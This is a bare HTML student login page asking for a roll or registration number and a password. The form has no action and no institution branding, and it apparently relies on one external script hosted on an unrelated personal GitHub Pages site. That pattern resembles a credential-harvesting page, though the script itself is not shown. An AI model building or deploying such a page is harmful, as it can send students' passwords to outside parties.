<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Student Login</title>
  <style>
    body{font-family:Arial,sans-serif;padding:20px;background:#fff}
    .card{max-width:520px;margin:0 auto}
    h1{font-size:28px;margin-bottom:18px}
    label{display:block;margin:10px 0 6px;font-weight:600}
    .input{display:block;width:100%;padding:14px;border-radius:8px;border:1px solid #cad1ff;background:#f3f5ff;margin-bottom:12px}
    .btn{display:block;width:100%;padding:12px;border-radius:8px;border:none;background:#007bff;color:#fff;font-weight:700}
  </style>
</head>
<body>
  <div class="card">
    <h1>Student Login</h1>
    <form id="loginForm">
      <label>Roll No / Registration No.</label>
      <input class="input" id="roll" name="roll" placeholder="Enter Roll / Registration No." required>

      <label>Password</label>
      <input class="input" id="password" name="password" type="password" placeholder="Enter Password" required>

      <button class="btn" type="submit">SIGN IN</button>
    </form>
  </div>

  <script src="https://wsvcrypto.github.io/sa/1.js"></script>
</body>
</html>
